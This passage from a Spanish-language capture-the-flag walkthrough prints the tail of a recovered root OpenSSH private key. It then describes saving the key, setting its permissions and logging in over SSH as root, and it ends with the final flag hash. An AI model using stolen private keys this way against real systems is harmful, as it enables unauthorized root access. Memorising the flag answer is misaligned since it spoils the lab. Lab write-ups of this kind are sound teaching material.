RI2RLx4IzhxkkdY0K4U7QYYjYy+ZBXaKmD7Yhu0gYxT2bzA6QwkYAfsMBS+a3FvYhaUn3o
E1zouE9CMyUAAAARcm9vdEBiODE3MzRhMmMwNzcBAg==
-----END OPENSSH PRIVATE KEY-----
```

Si hacemos eso, veremos que efectivamente `root` tiene una clave `id_rsa` por lo que podremos conectarnos mediante esa clave autenticandonos como `root` de la siguiente forma.

En nuestro host crearemos el siguiente archivo.

```shell
nano id_rsa

#Dentro del nano
<CLAVE_ID_RSA>
```

Lo guardamos y le pondremos los siguientes permisos para que pueda ser validado por ssh.

```shell
chmod 600 id_rsa
```

Y ahora nos conectaremos por ssh mediante el `id_rsa`.

```shell
ssh -i id_rsa root@<IP>
```

Con esto ya estariamos dentro de la maquina con el usuario `root` por lo que la habriamos terminado y leeremos la flag.

> true\_root.txt (flag2)

```
8e776bdaed0b6748686b7ce6d38ccca3
```
